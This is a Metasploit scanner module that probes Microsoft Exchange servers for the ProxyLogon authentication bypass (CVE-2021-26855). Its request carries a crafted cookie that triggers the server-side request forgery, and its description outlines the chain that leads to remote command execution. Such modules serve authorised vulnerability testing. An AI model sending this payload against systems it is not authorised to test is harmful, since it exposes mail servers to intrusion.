##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# begin auxiliary class
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon',
        'Description' => %q{
          This module scan for a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication and impersonating as the
          admin (CVE-2021-26855).

          By chaining this bug with another post-auth arbitrary-file-write
          vulnerability to get code execution (CVE-2021-27065).

          As a result, an unauthenticated attacker can execute arbitrary commands on
          Microsoft Exchange Server.

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse'],
          ['URL', 'http://aka.ms/exchangevulns']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptEnum.new('METHOD', [true, 'HTTP Method to use (for CVE-2021-26855).', 'POST', ['GET', 'POST']])
    ])
  end

  def run_host(target_host)
    uri = normalize_uri('owa', 'auth', 'x.js')

    received = send_request_cgi(
      'method' => datastore['METHOD'],
      'uri' => uri,
      'cookie' => 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
    )
    unless received
      print_error("#{full_uri(uri)} - No response, target seems down.")

      return Exploit::CheckCode::Unknown
    end

    if received && received.code != 500
      print_error("#{full_uri(uri)} - The target is not vulnerable to CVE-2021-26855.")
      vprint_error("Obtained HTTP response code #{received.code} for #{full_uri(uri)}.")

      return Exploit::CheckCode::Safe
    end

    print_good("#{full_uri(uri)} - The target is vulnerable to CVE-2021-26855.")
    msg = "Obtained HTTP response code #{received.code} for #{full_uri(uri)}."
    vprint_good(msg)

    report_vuln(
      host: target_host,
      name: name,
      refs: references,
      info: msg
    )

    Exploit::CheckCode::Vulnerable
  end
end
